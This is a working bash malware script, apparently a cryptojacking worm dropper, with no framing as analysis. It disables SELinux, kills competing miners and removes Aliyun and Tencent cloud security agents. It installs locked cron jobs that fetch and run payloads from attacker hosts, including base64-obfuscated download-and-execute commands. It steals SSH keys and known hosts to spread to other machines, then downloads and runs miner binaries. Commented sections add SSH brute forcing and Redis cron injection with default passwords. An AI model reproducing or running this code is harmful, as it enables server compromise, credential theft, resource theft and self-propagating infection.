 #!/bin/bash
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
setenforce 0 2>/dev/null
ulimit -u 50000
sysctl -w vm.nr_hugepages=$((`grep -c processor /proc/cpuinfo` * 3))
echo "" > /etc/ld.so.preload
netstat -antp | grep ':3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':4444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':5555'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':7777'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':14444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':5790'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':45700'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':2222'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':9999'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':20580'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep ':13531'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '23.94.24.12:8080'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs kill -9
netstat -antp | grep '134.122.17.13:8080'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs kill -9
ps -fe | grep 'network01' | awk '{print $2}' | xargs kill -9
ps -fe | grep 'sysrv' | awk '{print $2}' | xargs kill -9

rand=$(seq 0 255 | sort -R | head -n1)
rand2=$(seq 0 255 | sort -R | head -n1)


if ps aux | grep -i '[a]liyun'; then
  (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
  (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
sleep 1
echo "DER Uninstalled"

chattr -ai /tmp/dbused

if [ -s /usr/bin/ifconfig ];
then
	range=$(ifconfig | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
else
	range=$(ip a | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
fi

if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        dns=""
else
        dns="-d"
fi

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        url="bash.givemexyz.in"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"
else
        url="194.5.249.238"
        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuNS4yNDkuMjM4L2QucHkiKS5yZWFkKCkpJw=="
fi


if cat /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down | grep -q "205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|194.156.99.30\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw=="
then
    chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down
    crontab -r
    echo "Cron not found"
	echo -e "*/1 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/root
	echo -e "*/2 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/apache
	echo -e "*/3 * * * * root /dev/shm/dbusex -c $dns && /home/`whoami`/dbusex -c $dns && /var/run/dbusex -c $dns && /root/dbusex -c $dns\n##" > /etc/cron.d/nginx
	echo -e "*/30 * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms\n; rm -rf /tmp/xms\n##" > /var/spool/cron/root
	echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjE5NC41LjI0OS4yMzgiCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh4T1RRdU5TNHlORGt1TWpNNEwyUXVjSGtpS1M1eVpXRmtLQ2twSnc9PSIKZmkKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8tIGh0dHA6Ly8kdXJsL3htcyl8YmFzaCAtc2g7IGVjaG8gJGJhc2UgfCBiYXNlNjQgLWQgfCBiYXNoIC07IGx3cC1kb3dubG9hZCBodHRwOi8vJHVybC94bXMgL3RtcC94bXM7IGJhc2ggL3RtcC94bXM7IHJtIC1yZiAvdG1wL3htcycgPiAvZXRjL2luaXQuZC9kb3du | base64 -d | bash -
	mkdir -p /var/spool/cron/crontabs
	echo -e "* * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	echo "(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
fi

localgo() {
	echo "localgo start"
	myhostip=$(curl -sL icanhazip.com)
	KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
	KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
	KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
	KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
	HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
	HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
	HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
	HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
	HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
	HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
	USERZ=$(
		echo "root"
		find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
	)
	USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
	sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
	userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
	hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
	keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
	i=0
	for user in $userlist; do
		for host in $hostlist; do
			for key in $keylist; do
				for sshp in $sshports; do
					((i++))
					if [ "${i}" -eq "20" ]; then
						sleep 5
						ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
						i=0
					fi

					#Wait 5 seconds after every 20 attempts and clean up hanging processes

					chmod +r $key
					chmod 400 $key
					echo "$user@$host"
					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
				done
			done
		done
	done
	# scangogo
	echo "local done"
}

echo -e "*/1 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/root
echo -e "*/2 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/apache
echo -e "*/3 * * * * root /dev/shm/dbusex -c $dns && /home/`whoami`/dbusex -c $dns && /var/run/dbusex -c $dns && /root/dbusex -c $dns\n##" > /etc/cron.d/nginx
echo -e "*/30 * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms\n; rm -rf /tmp/xms\n##" > /var/spool/cron/root
echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjE5NC41LjI0OS4yMzgiCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh4T1RRdU5TNHlORGt1TWpNNEwyUXVjSGtpS1M1eVpXRmtLQ2twSnc9PSIKZmkKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8tIGh0dHA6Ly8kdXJsL3htcyl8YmFzaCAtc2g7IGVjaG8gJGJhc2UgfCBiYXNlNjQgLWQgfCBiYXNoIC07IGx3cC1kb3dubG9hZCBodHRwOi8vJHVybC94bXMgL3RtcC94bXM7IGJhc2ggL3RtcC94bXM7IHJtIC1yZiAvdG1wL3htcycgPiAvZXRjL2luaXQuZC9kb3du | base64 -d | bash -
mkdir -p /var/spool/cron/crontabs
echo -e "* * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /var/spool/cron/crontabs/root
mkdir -p /etc/cron.hourly
echo "(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down

DIR=`cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || cd /var/tmp; pwd`

cd $DIR

WGET="wget -O"
if [ -s /usr/bin/curl ];
then
    WGET="curl -o";
fi
if [ -s /usr/bin/wget ];
then
    WGET="wget --no-check-certificate -O";
fi
if [ -s /usr/bin/wget2 ];
then
    WGET="wget2 --no-check-certificate -O";
fi
if [ -s /usr/bin/curl2 ];
then
    WGET="curl2 -o";
fi

f2="$url"

downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
        if [ ! -f $DIR/x86_64 ]; then
            echo "File not found!"
            download
        fi
        sum=$(md5sum $DIR/x86_64 | awk '{ print $1 }')
        echo $sum
        case $sum in
            dc3d2e17df6cef8df41ce8b0eba99291 | dc3d2e17df6cef8df41ce8b0eba99291)
                echo "x86_64 OK"
            ;;
            *)
                echo "x86_64 wrong"
                sizeBefore=$(du $DIR/x86_64)
                if [ -s /usr/bin/curl ];
                then
                    WGET="curl -k -o ";
                fi
                if [ -s /usr/bin/wget ];
                then
                    WGET="wget --no-check-certificate -O ";
                fi
                download
                sumAfter=$(md5sum $DIR/x86_64 | awk '{ print $1 }')
                if [ -s /usr/bin/curl ];
                then
                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/x86_64` > $DIR/tmp.txt
                fi
            ;;
        esac
    else
        echo "No md5sum"
        download
    fi
}


download() {
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/x86_643 | awk '{ print $1 }')
        echo $sum
        case $sum in
            dc3d2e17df6cef8df41ce8b0eba99291 | dc3d2e17df6cef8df41ce8b0eba99291)
                echo "x86_64 OK"
                cp $DIR/x86_643 $DIR/x86_64
				        cp $DIR/x86_643 $DIR/x86_64
            ;;
            *)
                echo "x86_64 wrong"
                download2
            ;;
        esac
    else
        echo "No md5sum"
        download2
    fi
}

download2() {
   if [ `getconf LONG_BIT` = "64" ]
   then
	$WGET "$DIR"/x86_64 http://$url/x86_64
	lwp-download http://$url/x86_64 "$DIR"/x86_64
	chmod +x $DIR/x86_64
	$DIR/x86_64 -pwn
	$DIR/x86_64 $dns -c
   else
	$WGET "$DIR"/i686 http://$url/i686
	lwp-download http://$url/i686 "$DIR"/i686
	chmod +x $DIR/i686
	$DIR/i686 -pwn
	$DIR/i686 $dns -c
   fi
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/x86_64 | awk '{ print $1 }')
        echo $sum
        case $sum in
            dc3d2e17df6cef8df41ce8b0eba99291 | dc3d2e17df6cef8df41ce8b0eba99291)
                echo "x86_64 OK"
                cp $DIR/x86_64 $DIR/x86_643
            ;;
            *)
                echo "x86_64 wrong"
            ;;
        esac
    else
        echo "No md5sum"
    fi
}

judge() {
    if [ ! "$(netstat -ant|grep '194.5.249.24:8080\|212.114.52.24:8080'|grep 'ESTABLISHED'|grep -v grep)" ];
    then
        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
	      do
	      kill -9 $procid
        done
        downloadIfNeed
	if [ `getconf LONG_BIT` = "64" ]
   	then
		$WGET "$DIR"/x86_64 http://$url/x86_64
		lwp-download http://$url/x86_64 "$DIR"/x86_64
		chmod +x $DIR/x86_64
		$DIR/x86_64 -pwn
		$DIR/x86_64 $dns -c
   	else
		$WGET "$DIR"/i686 http://$url/i686
		lwp-download http://$url/i686 "$DIR"/i686
		chmod +x $DIR/i686
		$DIR/i686 -pwn
		$DIR/i686 $dns -c
    	fi
    else
	echo "Running"
    fi
}

judge2() {
    if [ ! "$(netstat -ant|grep '194.5.249.24:8080\|212.114.52.24:8080'|grep 'ESTABLISHED'|grep -v grep)" ];
    then
	if [ `getconf LONG_BIT` = "64" ]
   	then
		$WGET "$DIR"/x86_64 http://$url/x86_64
		lwp-download http://$url/x86_64 "$DIR"/x86_64
		chmod +x $DIR/x86_64
		$DIR/x86_64 -pwn
		$DIR/x86_64 $dns -c
   	else
		$WGET "$DIR"/i686 http://$url/i686
		lwp-download http://$url/i686 "$DIR"/i686
		chmod +x $DIR/i686
		$DIR/i686 -pwn
		$DIR/i686 $dns -c
    	fi
    else
	echo "Running"
    fi
}

if [ ! "$(netstat -ant|grep '194.5.249.24:8080\|212.114.52.24:8080'|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
then
    judge2
else
     echo "Running"
fi


#if [ ! "$(ps -fe | grep '/usr/sbin/sshd  /tmp/ipss'| grep -v grep)" ]; then
#		if [[ $EUID = 0 ]];
#		then
#			echo "xd" > /tmp/.checking
#			$WGET "$DIR"/masscan http://209.141.40.190/masscan
#			$WGET "$DIR"/p http://209.141.40.190/ps
#			$WGET "$DIR"/hxx http://209.141.40.190/hxx
#			lwp-download http://209.141.40.190/masscan "$DIR"/masscan
#			lwp-download http://209.141.40.190/ps "$DIR"/ps
#			lwp-download http://209.141.40.190/hxx "$DIR"/hxx
#			chmod 777 "$DIR"/hxx
#			chmod 777 "$DIR"/masscan
#			rm -rf /tmp/sshcheck /tmp/ssh_vuln.txt /tmp/scan.log /tmp/ipss
#			nohup /tmp/masscan 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --max-rate 600000 -p22 --wait 0 | awk '{print $6}' > /tmp/ipss
#			#nohup /tmp/scan $rand.$rand2.0.0-$rand.$rand2.255.255 22 > /tmp/ssh_vuln.txt
#			#cat /tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /tmp/sshcheck
#			nohup /tmp/hxx 300 -f /tmp/ipss /tmp/ps 22 'curl -s http://209.141.40.190/xms | bash -sh; wget -q -O - http://209.141.40.190/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' >/dev/null 2>&1
#			echo Finished
#			pkill -9 hxx
#			rm -rf /tmp/.checking
#		else
#			echo "xd" > /tmp/.checking
#			$WGET "$DIR"/scan http://209.141.40.190/scan
#			$WGET "$DIR"/p http://209.141.40.190/ps
#			$WGET "$DIR"/hxx http://209.141.40.190/hxx
#			lwp-download http://209.141.40.190/scan "$DIR"/scan
#			lwp-download http://209.141.40.190/ps "$DIR"/ps
#			lwp-download http://209.141.40.190/hxx "$DIR"/hxx
#			chmod 777 "$DIR"/hxx
#			chmod 777 "$DIR"/scan
#			rm -rf /tmp/sshcheck /tmp/ssh_vuln.txt /tmp/scan.log /tmp/ipss
#			nohup /tmp/scan $range.0.0-$range.255.255 22 > /tmp/ssh_vuln.txt
#			cat /tmp/ssh_vuln.txt | grep "OpenSSH" | awk '{print $1}' | uniq | shuf > /tmp/ipss
#			nohup /tmp/hxx 300 -f /tmp/ipss /tmp/ps 22 'curl -s http://209.141.40.190/xms | bash -sh; wget -q -O - http://209.141.40.190/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' >/dev/null 2>&1
#			echo Finished
#			pkill -9 hxx
#			rm -rf /tmp/.checking
#	fi
#
#else
#	echo "Loading"
#fi

#if [ -f "/tmp/.checking" ];
#then
#	echo "loading"
#else
#	echo "xd" > /tmp/.checking
#	$WGET "$DIR"/linux.tar.gz http://$url/linux.tar.gz
#	$WGET "$DIR"/sshexec http://$url/sshexec
#	$WGET "$DIR"/sshpass http://$url/sshpass
#	lwp-download http://$url/linux.tar.gz "$DIR"/linux.tar.gz
#	lwp-download http://$url/sshexec "$DIR"/sshexec
#	lwp-download http://$url/sshpass "$DIR"/sshpass
#	chmod 777 "$DIR"/sshexec
#	chmod 777 "$DIR"/sshpass
#	sed -i 's/:/ /g' /tmp/sparte.txt
#	nohup echo UlNBS0VZPSJubyIgU0NQPSJubyIgRXhlY1NwZWVkPSJ5ZXMiIENNRD0iY2QgL3Zhci90bXAvOyB3Z2V0IC1PIC92YXIvdG1wL2xpbnV4LnRhci5neiBodHRwOi8vMjA1LjE4NS4xMTYuNzgvbGludXgudGFyLmd6IHwgY3VybCAtbyAvdmFyL3RtcC9saW51eC50YXIuZ3ogaHR0cDovLzIwNS4xODUuMTE2Ljc4L2xpbnV4LnRhci5neiB8IGx3cC1kb3dubG9hZCBodHRwOi8vMjA1LjE4NS4xMTYuNzgvbGludXgudGFyLmd6IC92YXIvdG1wL2xpbnV4LnRhci5nejsgdGFyIC14dmYgL3Zhci90bXAvbGludXgudGFyLmd6OyBjaG1vZCA3NzcgL3Zhci90bXAvKjsgL3Zhci90bXAvZ287IGVjaG8gY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh5TURVdU1UZzFMakV4Tmk0M09DOTBaWE11Y0hraUtTNXlaV0ZrS0NrcEp3PT0gfCBiYXNlNjQgLWQgfCBiYXNoIC0iIFBPUlQ9IjIyIiBVc2VyS25vd25Ib3N0c0ZpbGU9IiAiIEJhdGNoTW9kZT0ibm8iIENvbm5lY3RUaW1lb3V0PSIxNSIgU3RyaWN0SG9zdEtleUNoZWNraW5nPSJubyIgRm9ybWF0PSJVU0VSIFBBU1MgSVAiIC90bXAvc3NoZXhlYyAvdG1wL3NwYXJ0ZS50eHQ= | base64 -d | bash - >/dev/null 2>&1
#	rm -rf /tmp/.checking
#fi

#if [ -f "/tmp/.redis" ]; then
#	if ! command -v "redis-cli" &> /dev/null
#	then
#		echo "COMMAND could not be found"
#		apt install redis-tools -y >/dev/null
#		yum install redis-tools -y >/dev/null
#
#	else
#		if [[ $EUID = 0 ]]; then
#			echo "xd" > /tmp/.redis
#			apt install redis-tools -y >/dev/null
#			yum install redis-tools -y >/dev/null
#			echo 'config set dbfilename "backup.db"' > /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			echo 'flushall' >> /tmp/.dat
#			echo 'set backup1 "\n\n\n*/2 * * * * wget -q -O - http://209.141.40.190/xms | bash -sh\n\n"' >> /tmp/.dat
#			echo 'set backup2 "\n\n\n*/3 * * * * curl -fsSL http://209.141.40.190/xms | bash -sh\n\n"' >> /tmp/.dat
#			echo 'set backup3 "\n\n\n*/4 * * * * lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n\n"' >> /tmp/.dat
#			echo 'set backup4 "\n\n\n*/5 * * * * echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -\n\n"' >> /tmp/.dat
#			echo 'config set dir "/var/spool/cron/"' >> /tmp/.dat
#			echo 'config set dbfilename "root"' >> /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			echo 'config set dir "/var/spool/cron/crontabs"' >> /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			sleep 1
#			rm -rf /tmp/redis_vuln.txt
#			nohup /tmp/masscan 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --max-rate 600000 -p6379 --wait 0 | awk '{print $6}' > /tmp/redis_vuln.txt
#			cat /tmp/redis_vuln.txt | while read line; do
#			cat /tmp/.dat | timeout 3 redis-cli -h $line &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a redis &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a root &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a oracle &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a password &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a p@ssw0rd &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a qwerty &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a qwerty123 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a abc123 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a abc123! &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a 123456 &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a admin &>/dev/null &
#			cat /tmp/.dat | timeout 3 redis-cli -h $line -a mysql &>/dev/null &
#			done < /tmp/redis_vuln.txt
#			rm -rf /tmp/.redis
#		else
#			echo "xd" > /tmp/.redis
#			echo 'config set dbfilename "backup.db"' > /tmp/.dat
#			echo 'save' >> /tmp/.dat
#			echo 'flushall' >> /tmp/.dat
#			echo 'set backup1 "\n\n\n*/2 * * * * wget -q -O - http://209.141.40.190/xms | bash -sh\n\n"' >> /tmp/.dat
#			echo 'set backup2 "\n\n\n*/3 * * * * curl -fsSL http://209.141.40.190/xms | bash -sh\n\n"' >> /tmp/.dat
#			echo 'set backup3 "\n\n\n*/4 * * * * lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n\n"' >> /tmp/.dat
